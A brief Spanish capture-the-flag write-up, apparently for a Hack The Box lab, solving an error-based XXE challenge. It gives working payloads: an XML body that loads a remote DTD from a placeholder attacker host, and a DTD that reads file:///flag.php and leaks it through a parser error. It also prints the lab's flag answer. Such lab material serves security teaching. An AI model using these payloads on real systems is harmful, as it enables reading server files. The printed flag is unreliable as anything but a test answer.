# Laboratorio: Error Based 🌋

1. Una vez que estemos en la página web, lo que tenemos que hacer es interceptar la solicitud de **`Contact Form`**
---
2. Ahora realizaremos una solicitud por **`POST`** a la ruta `/error/submitDetails.php`, y con la data
```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://[IP]:[Port]/xxe.dtd">
  %remote;
  %error;
]>
```
---
3. Antes de enviar la solicitud, tenemos que hostear una entidad **`xxe.dtd`** con el siguiente contenido

```xml
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nothig;/%file;'>">
```

* Leeremos el archivo **`/flag.php`**
* Ahora, usamos **Python** para hostear esta entidad: `python3 -m http.server [Port]`
---

4. Enviamos la solicitud y veremos la **`flag`**
`HTB{3rr0r5_c4n_l34k_d474}`